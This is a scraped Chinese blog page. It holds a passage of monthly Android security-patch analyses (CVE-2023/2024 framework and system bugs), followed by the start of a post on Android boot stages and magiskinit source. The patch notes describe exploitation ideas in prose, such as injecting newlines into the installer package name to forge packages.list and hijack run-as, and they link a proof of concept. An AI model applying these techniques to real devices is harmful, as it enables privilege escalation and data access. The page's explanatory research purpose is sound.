IIntentSender 实际上可能是 app 的一个 binder，再在上面调用 send 实际上相当于把 allowlist token 直接发送给了 app，然后这个 token 可以用来绕过很多的后台限制。大概猜测一下利用方法：创建一个自定义 IIntentSender把它塞进一个 PendingIntent 里（PendingIntent 存放着一个 IIntentSender，这是它的真正实现）把 PendingIntent 放进 notification deleteIntent 里发送 notification 然后立刻取消，触发 deleteIntent 执行PendingIntent.send() 把内部的 IIntentSender 传递到 sendIntentSender，因为这个 IIntentSender 不是 PendingIntentRecord，所以 IIntentSender.send() 被调用，此时会直接把 allowlist token 发给 app妙啊，太妙了疑问：1月4号我也看见了这个补丁，为什么现在才发出来？CVE-2024-23705 EoP High在 CVE-2024-0024 补丁的基础上限制 accountOptions 的大小，防止类似的问题。CVE-2024-23708 EoP High让系统发出的 toast 优先显示，保证其他应用不能通过发送大量 toast 的方式延后系统 toast 显示。同时把粘贴剪贴板文字的 toast 的显示时长加到 long。System（跳过 CVE-2024-23709）CVE-2024-23706 EoP Criticalandroid health 相关的功能，禁止插入 record types 为空的 changelog。对这模块不是很熟，没看懂能干啥，也没看懂为啥定级这么高，待进一步分析。CVE 描述：In multiple locations, there is a possible bypass of health data permissions due to an improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2024-0043 EoP High在 PermissionController 后端禁止给 work profile 中的应用授权监听通知。更新：据反馈，此漏洞触发方式是通过 companion device watch role 自动授予相关权限。注：官方公告里放的补丁链接似乎是错的，正确的应该是 https://cs.android.com/android/_/android/platform/packages/modules/Permission/+/47a06cd49981d3fbe58158e9252f0a825aa109cdCVE-2024-23707 EoP High系统设置里 SearchResultTrampoline 把原来的用 getCallingActivity 判断调用者改成用 getLaunchedFromPackage，前者返回的是哪个 activity 会收到 onActivityResult 回调，后者返回的是实际启动 Activity 的人（Pending intent 按创建者算）2024-04-01这次补丁给我的感觉就是，像愚人节特辑FrameworkCVE-2024-23710 EoP High如果一个 app 和特权 app 共享 UID，并且设置了 sharedUserMaxSdkVersion 且处于生效状态，那么 sharedUserId 的设置是无效的，这个时候不应该把它标记为特权 appCVE-2024-23713 EoP HighNotificationManagerService migrateNotificationFilter 内如果传入的 disallowApps 并没有被安装就跳过它。猜测问题是可以传入超长字符串阻止 mRequestedNotificationListeners 被序列化，从而阻止数据变更被保存？CVE-2024-0022 ID HighCompanionDeviceManagerService requestNotificationAccess 没有检查传入的 user id，而是留了个 TODO 在那里（写到一半想着先这样完事然后就忘了？），然后直接用这个 user id 取得一个 PendingIntent 并返回，然后发送这个 pending intent 实际上可以跳到对应用户的通知访问管理页面。这个问题我很早就注意到了，但是反馈被标 duplicate 了。CVE-2024-23712 DoS HighAppOpsService 里过滤未被定义的 proxyAttributionTag （这啥？），同时把一个包里最大能定义的标签的数量从 10000 下调到 1000，防止大量数据造成 DoS。有待进一步分析。SystemCVE-2024-23704 EoP High如果当前用户有 DISALLOW_ADD_WIFI_CONFIG 这个限制，不允许打开 WifiDialogActivity。CVE-2023-21267 ID High去年12月的补丁，原问题是有 app pining 的时候尝试按电源键 lockdown 会因为逻辑错误跳过锁屏。原来的补丁有问题，回滚了之后修复了问题重新提交。CVE-2024-0026/CVE-2024-0027 DoS High大量 snoozed notifications 可能导致的拒绝服务问题（这个问题不是修过几次吗怎么又来了？）。判断 snooze notification 数量是否超限的时候要把已经存进文件里的（mPersistedSnoozedNotifications 和 mPersistedSnoozedNotificationsWithContext）一并纳入计算。还修复了 repostGroupSummary 方法里没有把通知从 mPersistedSnoozedNotifications 和 mPersistedSnoozedNotificationsWithContext 里移除的问题，会导致不需要的通知数据始终被序列化，可能被滥用导致资源耗尽拒绝服务。2024-03-01Framework（跳过了 CVE-2024-0049/CVE-2024-0050/CVE-2024-0051，三个都是 libstagefright 中的内存错误）CVE-2024-0044 EoP High过滤应用的“安装者包名”（可以通过 pm install -i 指定）里的非法字符。此漏洞细节：攻击者可以在“安装者包名”内插入换行符，之后系统会把该字段原样写进 /data/system/packages.list 里，伪造出新的条目，之后可以通过伪造的条目欺骗 run-as 从而获得受害应用的权限，可以操作内部目录等。发现者的博客写的很清楚了：https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.html数据取证专用漏洞了属于是CVE-2024-0046 EoP High阻止系统应用被升级为 instant app（免安装应用 谷歌小程序）。免安装应用只能获得很小的一部分权限，攻击者可以利用该漏洞使特定系统应用的权限失效，从而绕过运营商限制。CVE-2024-0048 EoP HighAccountManagerService 又上新补丁了。AccountManagerService 内部有一个超时机制，bind 到 Authenticator 后如果它长时间没响应就 unbind。搞笑的是，代码里根本没有任何地方启动这个机制，整个超时机制根本不会被触发。AccountManager API 最初在 Android 2.1 里加入，十几年过去了还能有这种问题，提前预定一个 2024 年最搞笑漏洞。CVE-2024-0053 ID High如果打印服务返回的自定义的打印机图标里的 URI 指向其他用户就把它过滤掉，防止看见其他用户的图像。最近这种漏洞真的好多好多。CVE-2024-0047 DoS HighAndroid 14 中对设备管理（Android for Work 的功能）的重构中引入的 bug，设备管理员设置的 global restriction（对整个设备的限制）可能会被错误识别为 local restriction（对单个用户的限制），导致管理员无法撤销限制，设备功能受限。就算 bug 修好了，已经损坏的配置文件仍然是损坏的，为了让这些设备不清除数据就能正常工作还要加个 workaround。System（跳过了 CVE-2024-0039、CVE-2024-23717、CVE-2024-0045）CVE-2023-40081 ID HighSystemUI 加载多媒体文件的图标时检查 URI 权限，防止跨用户读取CVE-2024-0052 ID High对 Android Health 这个功能不是很熟，看提交信息是如果调用者没有权限，部分 API 返回的数据要去除掉用户运动的路线信息。2024-02-01FrameworkCVE-2024-0029 EoP HighDevicePolicyManagerService 里的逻辑 bug，保存禁止截屏的状态的时候只用了一个 int 保存被禁用的用户 id，在未受管用户启动的时候会覆盖掉之前设置的。CVE-2024-0032 EoP HighDownloadStorageProvider 正确重写带有 includeHidden 参数的 queryChildDocuments()。更多可参考 https://t.me/qianqianzhuang/4CVE-2024-0034 EoP High阻止壁纸服务从后台启动 activity。因为前台客户端绑定壁纸服务之后，会满足这一条豁免条件 “该应用的一项服务被另一个可见的应用绑定。绑定到该服务的应用必须保持可见，以便后台应用成功启动 activity。”安卓 14 的 BAL 强化中限制了 target&gt;=U 时必须指定 BIND_ALLOW_ACTIVITY_STARTS 才允许服务进程借用客户进程的状态启动，故该漏洞不影响 14CVE-2024-0036 EoP HighstartNextMatchingActivity 中设置 setAvoidMoveToFront 阻止后台启动 activity，具体可见 https://mp.weixin.qq.com/s/dbupJ3D-i0Da9ml1Pamu-w这个接口漏了这么久都没人注意到确实挺难得的，当然我也没注意到，但是你看别人都没注意到，所以也不能怪我，你说是吧CVE-2024-0038 EoP HighinjectInputEventToInputFilter 中缺失调用者权限检查，只影响 14CVE-2024-0041 EoP HighremovePersistentDot 里的竞态条件，有可能导致 persistent dot 不会移除（然后会覆盖新显示的状态？）CVE-2023-40122 &amp; CVE-2024-0037 EoP High检查自动填充相关传入的 URI，确保不会读取到其他用户的数据CVE-2024-0040 ID HighMTP 协议处理中没有正确增大缓冲区大小，可能发生越界读SystemCVE-2024-0031 RCE Critical蓝牙 GATT 协议栈里的越界写，理论可实现 RCE。这玩意真的几乎每个月都能搞一个 RCE 出来。CVE-2024-0014 EoP High该漏洞未公开补丁链接，似乎是 GMS 私有组件。漏洞描述：In startInstall of UpdateFetcher.java, there is a possible way to trigger a malicious config update due to a logic error. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2024-0033 EoP Highlibbinder 打开 memfd 时指定 F_SEAL_GROW | F_SEAL_SHRINK 阻止后续其他进程更改大小造成错误CVE-2024-0035 EoP HighTileService 返回 null 时正确释放资源，阻止绕过后台启动前台 activity 的限制。更多可以参考 https://wrlus.com/android-security/bindservice-error-handle/CVE-2023-40093 ID High升级 pdfium 到 Chrome 114.0.5735.130 的CVE-2024-0030 ID High蓝牙组件里不充分的检查可能造成越界读2024-01-01FrameworkCVE-2023-21245 EoP High阻止在设备设置向导完成之前进入锁屏，可以插入一张需要 PIN/PUK 码解锁的 SIM 卡复现。应该是可以绕过恢复出厂保护（FRP，Factory Reset Protection），也就是所谓的激活锁。CVE-2024-0015 EoP High保证 DreamService 配置的 settingsActivity 属于应用自身，防止调用到非公开的 activity 造成 launch anywhere。向上搜索可以发现 SettingsLib 的 DreamBackend launchSettings() 这个方法会直接 startActivity，这里在 Settings 里运行所以是 system 权限。题外话：DreamService 是 Android 4.2 加入的，十几年过去了，相关代码在2024年1月还能出现这么简单直接的漏洞确实有点不可思议。这个补丁早在2022年就创建了，而且更新的版本列表里并没有最新的14，于是我去看了下14的代码发现确实已经合进了这个补丁，然后我搜索这个补丁，发现这个漏洞早在2022年就被确认并被授予 CVE-2022-20550 这个编号，但是谷歌当时不知道怎么想的只给了 moderate 评级然后只给 pixel 修了。。。CVE-2024-0018 EoP Highlibstagefright 里无符号数运算不当导致意外结果的漏洞。CVE-2024-0019 ID HighSystem UI 进程重启后，如果在重启之前有应用在进行敏感操作，并且现在还没结束，那么仍然应该显示隐私指示器。SystemCVE-2024-0021 EoP High禁止工作空间（work profile）内的应用监听通知，只给 13 14 更新了，应该是以前正常的功能，大版本迭代不小心引入。CVE-2024-0017 ID HighCamera2 如果是被其他 app 启动，而且启动它的这个 app 没有位置权限，返回的照片 exif 信息里不应该包含位置信息。之前的代码里有做判断，但是有问题，getCallingPackage 返回 null 的时候一律判定为不是 app 启动不需要过滤，但是如果 app 用 startActivity 而非 startActivityForResult ，getCallingPackage 本来就会返回 null，算是逻辑 bug。CVE-2024-0020 ID High设置铃声的时候检查传入的 URI，防止指向别的用户的数据。最近这种问题似乎很多很多。2023-12-01可能在野被积极利用的漏洞：CVE-2023-33063、CVE-2023-33107、CVE-2023-33106FrameworkCVE-2023-40077 EoP Criticallibstagefright 里的 UAF 问题CVE-2023-40076 ID CriticalCredentialManagerUi 跑在 system_server，且创建 PendingIntent 的时候没有指定用户，默认会去用 context 对应的用户，然后指向 USER 0，其他用户拿到这个 PendingIntent 然后 send 就能跳转到主用户的凭据管理页面。不知道为什么定级这么高CVE-2023-40079 EoP HighShortcutService 启动 app 给出的 IntentSender 时指定 MODE_BACKGROUND_ACTIVITY_START_DENIED 防止 BALCVE-2023-40089 EoP HighDevicePolicyService.getCredentialManagerPolicy 需要传入 userId。感觉这个漏洞的实际影响情况可能是有跨用户权限的进程需要拿到其他用户的东西但是因为之前的设计问题所以拿不到？CVE-2023-40094 EoP HighkeyguardGoingAway 这个方法没检查调用者权限，然后所有 app 都能调用这个方法解除锁屏。CVE-2023-40095 EoP High又是一个忘了指定禁止 BAL 造成的 BAL bypass，这次是 requestGeofence 。CVE-2023-40096 EoP High更改的文件比较多，看起来是设置录音权限为仅前台时应用退到后台还会继续录音的问题。CVE-2023-40103 EoP High看提交信息是用 ApkAssets 的时候改成用基于引用计数的指针，防止 UAF/double freeCVE-2023-45774 EoP HighShortcutService 校验传入的 uri。看 cve 描述是能指定其他用户的图像。CVE-2023-45777 EoP High最看不懂的一集给了两个提交，第一个提交和九月份的 CVE-2023-35669 补丁是一样的，当时这个漏洞描述是 “there is a possible way to control other running activities”，第二个提交只是把弃用不带类型的 getParcelable 改成类型安全的，然而底下明明就有手动的类型检查，我觉得缺这个提交也没法利用，不知道为什么又分配了一个 CVE。看这个 CVE 的描述是能 Launch Anywhere ，不知道怎么能做到。AccountManagerService 里使用不带参数类型的 getParcelable() 方法可能会导致反序列化出非预期的对象，调用到其他类的构造方法，导致 parcel 数据被修改，绕过 checkKeyIntentParceledCorrectly 的缓解措施。PoC： https://github.com/michalbednarski/TheLastBundleMismatchCVE-2023-21267 ID High在 lockdown 模式始终展示锁屏。看起来是有 app pinning 的时候尝试 lockdown 会因为逻辑错误跳过显示锁屏。CVE-2023-40073 ID HighNotification style 相关的 uri 校验CVE-2023-40081 ID HighMediaDataManager URI 校验。截止目前已经是第三个了。CVE-2023-40092 ID HighShortcutService 多个函数检查 user id，防止跨用户操作CVE-2023-40074 DoS HighPersistableBundle 忽略无效数据，防止拒绝服务。CVE-2023-40075 DoS High限制能通过 addDynamicShortcuts 添加的快捷方式的数量。System这里面大部分洞都是比较传统的内存损坏，所以跳过了很多漏洞。CVE-2023-40088 RCE Critical蓝牙相关，com_android_bluetooth_btservice_AdapterService free callbackEnv 这个指针后没有置空，可能发生 UAF。不知道是不是我的错觉，总感觉近几个月能 RCE 的漏洞好像变多了。CVE-2023-40097 EoP High禁止创建目标为 Chooser 的快捷方式。没看懂有什么意义，看 CVE 描述是 URI grant。CVE-2023-21394 ID High添加 phone account 时检查给定的 URI，防止跨用户读取图片。嗯，第四个了。CVE-2023-35668 ID High又是 URI 相关的跨用户读取，这次还是 Notification 里……CVE-2023-40098 ID High看起来是有个叫 priority conversation widget 的东西，其他用户添加这个 widget 能看见主用户的通知。解决方法就是不让其他用户添加。","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"安全补丁分析栏目","slug":"安全补丁分析栏目","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E6%A0%8F%E7%9B%AE/"}]},{"title":"在故事开始之前的故事：Android 启动过程与 magiskinit 分析","slug":"android-booting-shenanigans-and-magiskinit-analysing","date":"2023-11-12T07:00:00.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2023/11/12/android-booting-shenanigans-and-magiskinit-analysing/","link":"","permalink":"https://blog.canyie.top/2023/11/12/android-booting-shenanigans-and-magiskinit-analysing/","excerpt":"终于开了一直想写的这篇文章，再不写点东西就真的是年更博客了……本文可以认为是 Android Booting Shenanigans 的中文补充说明，同时添加了 magiskinit 的一些处理细节。即使你对 magiskinit 没兴趣也可以看看，说不定就有一些你平时从来没注意到的细节呢 :)","text":"终于开了一直想写的这篇文章，再不写点东西就真的是年更博客了……本文可以认为是 Android Booting Shenanigans 的中文补充说明，同时添加了 magiskinit 的一些处理细节。即使你对 magiskinit 没兴趣也可以看看，说不定就有一些你平时从来没注意到的细节呢 :)Android Init在介绍 init 执行过程前，我们先来介绍一下 init 是什么。init 由 Linux 内核直接启动，是 Android 启动时用户空间的第一个进程，它的 pid 为 1。它承担了挂载关键系统分区、加载 SELinux policy、启动 property service、加载并执行启动脚本（init.rc）等重要工作。我们所熟知的 zygote、service manager 等进程就是被写在了 init.rc 内由 init 负责启动的。由于 init 进程的重要性，在安全层面它被视为内核的等效组件之一。抛开细节不谈，init 所做的重要的事情大概有这些：挂载 /dev /proc /sys 等重要文件系统，创建 /dev/urandom 等设备加载 SELinux policy 进 kernel启动 property service 处理 setprop 等事件执行 init.rc，完成系统剩余的启动流程，如解密 userdata、启动 zygote 等旧 rootfs 时代纯粹的 initAndroid 5.0.2 init.c，点进去搜索 main 查看源码，整个逻辑非常清晰，大概就是上面的列表做的事情，没什么好讲的。在这个时候，启动流程大概如下所示：Bootloader 加载 boot.img解压运行里面的 kernelkernel 初始化后，调用 populate_rootfs() 将 boot.img 内的 ramdisk 释放到 /运行 /init，此时因为 / 这个根文件系统的文件是从 boot.img 的 ramdisk 中来的，所以会运行 boot ramdisk 里的 initinit 完成用户空间的初始化工作，继续开机到了 Android 6.0 init.cpp，事情发生了一些变化：init 分了阶段。kernel 直接启动时，init 处在“一阶段”，此时 init 需要做一些用户空间的初始化工作，加载 SELinux policy，而此时因为 init 由 kernel 直接启动，它的 SELinux context 会是 u:r:kernel:s0，所以它会 exec 它本身来 transition 到它专属的 SELinux domain（u:r:init:s0）。也就是说，上面的第 5 步被拆分为下面几小步：进行挂载 /dev 等必要的初始化加载 SELinux policy重新执行 init 本身，让进程的 SELinux domain 由 kernel 转换到 init完成剩下的初始化，继续开机这就是以前 Android 设备启动的方式。如果你在这些设备开机完成后查看 mounts 你会看见这样的东西：1rootfs &#x2F; rootfs ro,relatime 0 0这代表 / 的文件系统类型是 rootfs，而 rootfs 是由 kernel 挂载 boot.img 内的 ramdisk 上去的。Project Treble 带来的旧式 system-as-root 分区布局到了 Android 8.0 时代（其实从 7.1 就开始准备了），Google 推出了 Project Treble。为了实现 Project Treble 及相关的 Generic System Image，/ 需要和系统相绑定。Google 选择了推出名为 system-as-root （以下简称为 SAR）的新分区布局。简单来说，/ 这个根文件系统中的内容不再来自 boot.img 内的 ramdisk，而是来自 system.img。为了实现这一行为，设备的 bootloader 在启动内核时会传递启动参数 skip_initramfs，设备的内核会看见这一参数，从而跳过 boot.img 内的 ramdisk 而是直接挂载 system.img 到 /。如果你在这些设备上查看 mounts，你会发现 / 的文件系统类型变成了 ext4（或 erofs？）而不是 rootfs。同时，还出现了一个新的东西，A/B (Seamless) System Update （即所谓的 A/B 分区）。设备的 boot/system/vendor 等关键分区现在其实有两个，一个会被使用，而另一个用作后备。当系统更新的时候，更新包其实会被写入后备分区。这样的好处时，当更新导致无法开机的时候，因为有另一个分区存储着可以开机的系统，设备可以自动回退到上一个可以开机的版本。副作用也很明显：这些分区本来只需要一个的，现在每个都需要两个，直接 double 了，需要更大的存储空间（之后 Google 还引入了 Virtual A/B，不过这都是后话了，对我们不重要）。怎么减少要用的存储空间呢？在之前，Android 设备需要一个 recovery 分区，里面存储着一个小型的 Linux 系统，用于在设备无法开机时可以进入 recovery 模式，从而恢复系统。虽然引入了 A/B 分区，但是 recovery 模式仍然需要保留，而 recovery 分区则不一定。对于 A/B 设备来说，由于 boot 现在有两个，即使其中一个分区因为不完整的系统更新被破坏，另一个也存储着完整的、未受破坏的 boot.img，所以 boot 至少有一个是可用的；而正常开机的时候，内核会直接挂载 system.img 到 /，boot 内的 ramdisk 未被使用，所以可以用来放 recovery 的 ramdisk。此时，设备的开机流程如下所示：bootloader 判断设备是正常启动，还是要启动到 recovery如果是正常启动，传递参数 skip_initramfs内核如果看见了 bootloader 传递过来的 skip_initramfs，就代表设备要正常启动，直接挂载 system.img 到 /；否则就是要启动到 recovery，因为 recovery 的 ramdisk 现在同样放在 boot，释放 boot.img 里的 ramdisk 到 /执行 init，继续启动流程。对于正常开机，这里 init 直接来自 system.img。而对于非 A/B 的设备，因为 boot 只有一个，可能会在 OTA 中被破坏，为了保证设备始终有可用的 recovery，它们仍然保留了 recovery 分区。boot 内的 ramdisk 根本不会被使用到，所以 boot.img 内根本没有 ramdisk，同时设备的 bootloader 可能会直接把 boot ramdisk 给排除掉（看 OEM 怎么实现的，像三星等大部分厂商就会排除，但是小米等小部分厂商就不会）。虽然 Google 在推出它时将其直接称为 system-as-root，但为了与下文的 2-Stage-Init System-as-root 区分开来，我们把它称为 Legacy SAR。Legacy SAR 对于出厂版本在 Android 9.0 以下的设备是可选的，但对于出厂 Android 9.0 的设备是强制的。Android 10+：有三步的两步启动！随着时间继续推移，到 Android 10 时，Google 推出了动态分区。对于上文提到的 Legacy SAR 来说，这是不可能的，因为 Linux 内核无法直接理解这种新的分区格式，无法将 system 挂载到 /。Google 的解决办法是：继续重写，发明新的启动方式！新的启动方式分为以下几步：像旧式 rootfs 一样，boot.img 内的 ramdisk 会被释放到 /执行 /init，所以 boot.img 内的 /init 会被执行init 进入“第一阶段”，初始化用户空间，挂载 /system执行一个 switch root 操作，将 rootdir 切换到 /system。现在的 / 其实是 switch root 之前的 /system。此时，设备的分区布局由旧式的 rootfs 变为 system-as-root。接下来是加载 SELinux policy，而这一步应该和 system 绑定，所以 init 选择执行 system 内的 init 来完成这一步。system 内的 init 收到前辈传来的 selinux_setup 参数，进入“第二阶段”，加载 SELinux policy。然后，为了把 SELinux domain 从 kernel 切到 init，init 再次执行自己。init 再次被 exec，进入“第三阶段”，完成剩下的初始化工作，继续开机。（可以查看 Android 10.0 init main.cpp，里面的代码很详细）。我们把这种新的启动方式称为 2-Stage-Init （简称为 2SI）。由于开机完成后，设备的 rootdir 和 Legacy SAR 一样是 system，所以我们仍然把这种分区布局看作是 system-as-root（虽然以 Google 的标准，只有 Legacy SAR 才被看作 SAR）。……慢着！明明 init 会被执行三次了，为什么把它称为“两步启动”？这是因为，这种启动方式会在用户空间改变 rootdir，从 rootfs 改变为 system-as-root，而上面提到的其他两种都不会改变 rootdir。我们把 switch root 之前称为“第一步”，把 switch root 之后称为“第二步”，就得到和其他两种启动方式所区分开的名字：2SI。对于出厂 Android 10+ 的设备来说，这种启动方式是强制的；从使用 rootfs 的旧系统更新到 Android 10+ 时，也需要使用这种新的启动方式；但对于使用 Legacy SAR 的设备，它们可以继续使用 Legacy SAR。典型的例子是 Google Pixel 3 &amp; 3a 系列，出厂时它们使用 Legacy SAR，但 Google 对其进行了改进，使得升级到 Android 10 后它们转为使用 2SI 方式启动。由于 Legacy SAR 和 2SI 最后都会使用 system-as-root 分区布局，所以搭载 Android 10+ 的设备其实都会使用 SAR。文档 中也提到 All devices running Android 10 must use a system-as-root partition layout to enable system-only OTAs.。注：在 Android 10+ 上使用 Legacy SAR 时，由于 Android 10 的 init 写死了会执行三次，所以也会有 first stage、setup selinux、second stage 这三步；虽然 rootdir 没有发生改变，为了与 Android 9.0 Legacy SAR 区别，我们把这种情况称为 2SI legacy SAR 或 Legacy SAR with 2SI，而本节中提到的会改变 rootdir 的启动方式称为 modern 2SI、2SI ramdisk SAR 或 2SI from initramfs。当我们使用简称 2SI 时，我们默认指的是 Modern 2SI。关于更多细节，可以查阅官方的 Android Init - Early Init Boot Sequence魅族：2SI，但是从 rootfs 到 rootfs（注：此种特殊行为在原版 Magisk - Android Booting Shenanigans 文档中并未列出）上文提到，“搭载 Android 10+ 的设备其实都会使用 SAR”，但对于魅族 16 系列来说并非如此。搭载 Android 10 的魅族 16 系列设备启动时会经过上面 2SI 的所有步骤，除了 switch root 这一步。由于并没有 switch root，所以设备会一直使用 rootfs。MagiskInit先来介绍一下 magiskinit 是什么：magiskinit 是 magisk 的重要组件之一，magisk 正是通过替换 init 为自己的 magiskinit 实现劫持设备启动过程的。可以通过查看文档来大概了解 magiskinit 做了什么。接下来我们结合上面的知识以及 magiskinit 源码来具体分析。注：截至发稿，本文分析的源码为 Magisk master 分支上的最新代码。最新 commit 为 cfb20b0，点进去可以浏览对应的文件。！！！硬核警告，非战斗人员请迅速逃离现场！！！由于 magiskinit 替换了 init，所以当内核执行 init 时，magiskinit 的 main() 会被执行。main() 的代码位于 init.cpp：123456789101112131415161718192021222324252627282930313233343536int main(int argc, char *argv[]) &#123; umask(0); auto name = basename(argv[0]); if (name == \"magisk\"sv) return magisk_proxy_main(argc, argv); if (getpid() != 1) return 1; BaseInit *init; BootConfig config&#123;&#125;; if (argc &gt; 1 &amp;&amp; argv[1] == \"selinux_setup\"sv) &#123; rust::setup_klog(); init = new SecondStageInit(argv); &#125; else &#123; // This will also mount /sys and /proc load_kernel_info(&amp;config); if (config.skip_initramfs) init = new LegacySARInit(argv, &amp;config); else if (config.force_normal_boot) init = new FirstStageInit(argv, &amp;config); else if (access(\"/sbin/recovery\", F_OK) == 0 || access(\"/system/bin/recovery\", F_OK) == 0) init = new RecoveryInit(argv, &amp;config); else if (check_two_stage()) init = new FirstStageInit(argv, &amp;config); else init = new RootFSInit(argv, &amp;config); &#125; // Run the main routine init-&gt;start(); exit(1);&#125;我们重点关注几个 if 分支。RootFSInit看名字就可以看出来，这就是用来处理上面提到的第一种分区布局 RootFS 的分支。类的定义在 init.hpp：1234567891011121314151617/************ * Initramfs ************/class RootFSInit : public MagiskInit &#123;private: void prepare();public: RootFSInit(char *argv[], BootConfig *config) : MagiskInit(argv, config) &#123; LOGD(\"%s\\n\", __FUNCTION__); &#125; void start() override &#123; prepare(); patch_rw_root(); exec_init(); &#125;&#125;;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586void RootFSInit::prepare() &#123; prepare_data(); LOGD(\"Restoring /init\\n\"); /** 把备份的原来的 init 重命名为 /init ，这样接下来我们执行 /init 的时候就会执行原本的 init **/ rename(backup_init(), \"/init\");&#125;#define PRE_TMPSRC \"/magisk\"#define PRE_TMPDIR PRE_TMPSRC \"/tmp\"void MagiskInit::patch_rw_root() &#123; mount_list.emplace_back(\"/data\"); parse_config_file(); // Create hardlink mirror of /sbin to /root mkdir(\"/root\", 0777); clone_attr(\"/sbin\", \"/root\"); link_path(\"/sbin\", \"/root\"); // Handle overlays load_overlay_rc(\"/overlay.d\"); mv_path(\"/overlay.d\", \"/\"); rm_rf(\"/data/overlay.d\"); rm_rf(\"/.backup\"); // Patch init.rc /** 修补 init.rc，植入我们的代码，让 init 启动我们的服务 **/ patch_rc_scripts(\"/\", \"/sbin\", true); bool treble; &#123; auto init = mmap_data(\"/init\"); treble = init.contains(SPLIT_PLAT_CIL); &#125; /** 因为 rootfs 是可写的，创建 /magisk，然后把 /magisk/tmp 当成 magisk 内部的 tmpfs，初始化 magisk 内部文件**/ xmkdir(PRE_TMPSRC, 0); xmount(\"tmpfs\", PRE_TMPSRC, \"tmpfs\", 0, \"mode=755\"); xmkdir(PRE_TMPDIR, 0); setup_tmp(PRE_TMPDIR); chdir(PRE_TMPDIR); // Extract magisk /** 释放 magisk32 magisk64 等文件 **/ extract_files(true); /** 修补 SELinux policy，注入我们的规则 **/ if ((!treble &amp;&amp; access(\"/sepolicy\", F_OK) == 0) || !hijack_sepolicy()) &#123; patch_sepolicy(\"/sepolicy\", \"/sepolicy\"); &#125; chdir(\"/\"); // Dump magiskinit as magisk /** 把 magiskinit 当成 magisk 复制到 /sbin/magisk。init 第一次启动我们的服务的时候，会进入 magisk_proxy_main **/ cp_afc(REDIR_PATH, \"/sbin/magisk\");&#125;int magisk_proxy_main(int argc, char *argv[]) &#123; rust::setup_klog(); LOGD(\"%s\\n\", __FUNCTION__); // Mount rootfs as rw to do post-init rootfs patches xmount(nullptr, \"/\", nullptr, MS_REMOUNT, nullptr); unlink(\"/sbin/magisk\"); // Move tmpfs to /sbin // make parent private before MS_MOVE /** 选择 /sbin 作为新的 magisk internal tmpfs（因为 /sbin 在 PATH 里，把 su 等可执行文件放在里面，运行 su 的时候直接就能找到这个文件并执行） **/ xmount(nullptr, PRE_TMPSRC, nullptr, MS_PRIVATE, nullptr); xmount(PRE_TMPDIR, \"/sbin\", nullptr, MS_MOVE, nullptr); xumount2(PRE_TMPSRC, MNT_DETACH); rmdir(PRE_TMPDIR); rmdir(PRE_TMPSRC); // Create symlinks pointing back to /root /** 恢复 sbin 里原本就有的文件 **/ recreate_sbin(\"/root\", false); // Tell magiskd to remount rootfs setenv(\"REMOUNT_ROOT\", \"1\", 1); /** 带上参数运行真正的 magisk32/magisk64 **/ execv(\"/sbin/magisk\", argv); return 1;&#125;patch_rc_scripts() 里最重要的就是把这段 rc 脚本注入进了 init.rc，使得 init 会在系统开机过程中自动执行 magisk：123456789101112131415on post-fs-data start logd exec %2$s 0 0 -- %1$s&#x2F;magisk --post-fs-dataon property:vold.decrypt&#x3D;trigger_restart_framework exec %2$s 0 0 -- %1$s&#x2F;magisk --serviceon nonencrypted exec %2$s 0 0 -- %1$s&#x2F;magisk --serviceon property:sys.boot_completed&#x3D;1 exec %2$s 0 0 -- %1$s&#x2F;magisk --boot-completeon property:init.svc.zygote&#x3D;stopped exec %2$s 0 0 -- %1$s&#x2F;magisk --zygote-restart对 init.rc 语法规则不熟的同学，可以参考 Android Init Language整个逻辑还是比较清晰的，忽略一些过于内部的细节，大概如下所示：kernel 执行 init，magiskinit 被运行，检测系统环境，进入 RootFSInit修补 init.rc，注入我们的代码初始化 magisk 内部要用到的 tmpfs修补 sepolicy，注入我们的规则（细节后面再谈）把 magiskinit 复制到 /sbin/magisk，这样 init 第一次执行 magisk 时会进入 magisk_proxy_main() 做剩余工作执行系统原来的 init，继续开机流程init 会解析并执行 init.rc，运行 magisk，这个时候运行的其实是 magiskinit，进入 magisk_proxy_main()把 /sbin 用作 magisk internal tmpfs，然后因为我们 mount 了 tmpfs 在 sbin 上，要把里面本来就有的文件恢复出来要不然就没了运行真正的 magisk32/magisk64Modern 2SI由于劫持 Legacy SAR 的启动过程过于复杂且存在太多种情况，我们先讲 Modern 2SI。劫持 Modern 2SI 启动过程的难点在于：由于一阶段 init 来自 boot.img 内 ramdisk，所以 magiskinit 会被执行；但是，一旦运行原来的 init，她就会挂载 /system、switch root 到 /system，我们对原来 rootfs 所做的修改 全 部 木 大。而 init 一阶段运行时，/system 还未被挂载，直接对 /system 做修改也行不通。所以我们必须找到一种方法，在 init 挂载 /system 之后做修改，且 /system 往往是 read-only 的，由于 system.img 可能是 de-duplicate 过的 ext4 或者干脆就是 EROFS，也不可能将其 remount 为 read-write，任何方式直接修改都行不通，只能用 bind-mount 这种方法变相修改。我们注意到，init 在 switch root 之前，会把现在的 mounts （除了 / 和 /system 本身）给 move 到新的 root 下面，然后再 switch root（具体代码可见这里）。通过利用这个特性，我们似乎可以让我们的某些东西在 switch root 之后仍然保留下来，但是怎么利用呢？我们还是来看看 magiskinit 的代码吧。magiskinit 的基本思想是，first stage 做一些 hack，执行原本的 init 让它为我们挂载 /system 并 switch root，然后通过前面做的 hack 想办法让 init 再次触发自己。也就是说，类似 2SI，它也是分两步走的。12345678910111213141516171819202122232425262728293031323334/*************** * 2 Stage Init ***************/class FirstStageInit : public BaseInit &#123;private: void prepare();public: FirstStageInit(char *argv[], BootConfig *config) : BaseInit(argv, config) &#123; LOGD(\"%s\\n\", __FUNCTION__); &#125;; void start() override &#123; prepare(); exec_init(); &#125;&#125;;class SecondStageInit : public MagiskInit &#123;private: bool prepare();public: SecondStageInit(char *argv[]) : MagiskInit(argv) &#123; LOGD(\"%s\\n\", 